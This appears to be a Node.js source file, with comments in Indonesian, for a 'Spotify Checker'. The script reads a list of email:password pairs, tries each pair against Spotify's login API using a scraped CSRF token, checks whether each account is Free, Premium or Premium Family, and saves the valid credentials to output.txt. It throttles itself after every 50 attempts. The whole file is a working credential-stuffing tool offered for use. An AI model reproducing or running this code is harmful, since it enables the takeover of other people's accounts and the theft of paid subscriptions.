/**
* THIS SPOTIFY ACCOUNT VALIDATOR 
* CLASS WAS BUILT BY FU
* DIPERLARANGKAN MENJUAL SIMPLE BASED !
* ON 10 September
* CopyRight 2019
* Developed Eric Pedra 
* Thanks Fu
*/
const request = require("request");
const cheerio = require('cheerio');
const clc = require('cli-color');
const LineByLineReader = require('line-by-line');
var lineReader = require('line-reader');
var fs = require('fs');
var sleep = require('system-sleep');
var readline = require('readline-sync');
var i = 0
//getcookies(token) + nama penggunaan/kata sandi
let crf_token
let cookie
let username,password
/*************Menu Design*************/
process.title = "Spotify Checker";
var combo = readline.question("Enter list (.txt):");
/*************************************Input TXT******************************************/
if(!combo.indexOf('.txt')){
	
	process.exit()
}
lineReader.eachLine(combo, function(line) {
//
//lr.pause();
username = line.split(':')[0] // Delim  punyamu misalnya email:password , kalau dilem | ,email|password
password = line.split(':')[1]

  //console.log(i) 

 get_login(username,password)
 if(i == 50){
	sleep(15000)
	i=0
	
 }
 i++
});

/******************Login************************/
function get_login(username,password) {
	//GET login
    var options1 = {
        method: 'GET',
        url: 'https://accounts.spotify.com/en/login/',

    }; 
    /*****Login Succes*****/
    request(options1, function(error, response, body){
        if (error) throw new Error(error);
        crf_token = response.headers['set-cookie'][0] //get cookie crf_token
        crf_token = crf_token.split('=')
        crf_token = crf_token[1]
        crf_token = crf_token.split(';')
        crf_token = crf_token[0]
        //console.log(crf_token);
        var options2 = {
            method: 'POST',
            url: 'https://accounts.spotify.com/api/login',
            headers: {
                'cookie': 'csrf_token=' + crf_token + ';__bon=MHwwfDEyMDI2MzkyMTd8NTA1MTA4NDcxMTR8MXwxfDF8MQ==;',
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'accounts.spotify.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
                origin: 'https://accounts.spotify.com',
                accept: 'application/json, text/plain, */*'
            },
            form: {
                'username':username ,
                'password':password,
                'remember': true,
                'csrf_token': crf_token
            }
        };
        /*********Checking Free - Premium - Spotify Premium Family **********/
        request(options2, function(error, response, body) {
            if (error) throw new Error(error);
			var obj = JSON.parse(body)
			//console.log(obj)
			if(!obj['error']){
			
            cookie = response.headers['set-cookie']
            //console.log(cookie);
            var options3 = {
                rejectUnauthorized: false,
                method: 'GET',
                url: 'https://www.spotify.com/us/account/subscription/',
				headers: { 'cookie':cookie,
				           'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
				}

            };
            request(options3, function(error, response, body) {
                //console.log(response.headers['set-cookie']);
				$ = cheerio.load(body);
				  var res = $("h3").eq(0)
				  var exp = $("b").eq(0)
				  if(res.text() == 'Spotify Premium'){

					  console.log(clc.red('-----------------------Premium-----------------------'));
					  console.log(clc.green('stats:'+res.text()));
					  console.log(clc.green('renew:'+exp.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
					  
				  }else{

					  if(res.text() == 'Spotify Premium Family'){
					  console.log(clc.red('---------------Spotify Premium Family----------------'));
					  console.log(clc.blue('stats:'+res.text()));
					  console.log(clc.blue('renew:'+exp.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
					  }else{

					  console.log(clc.red('---------------------------Free----------------------'));
					  console.log(clc.blue('stats:'+res.text()));
					  console.log(clc.red('-----------------------------------------------------'));
					  fs.appendFileSync("output.txt", username+":"+password + "|plane:"+res.text()+"|renew:"+exp.text()+"\n");
						  
					  }
					  
				  }

            });
		}else{
			
			console.log(clc.red('Login Fail'))
		
		}


        });




    });
}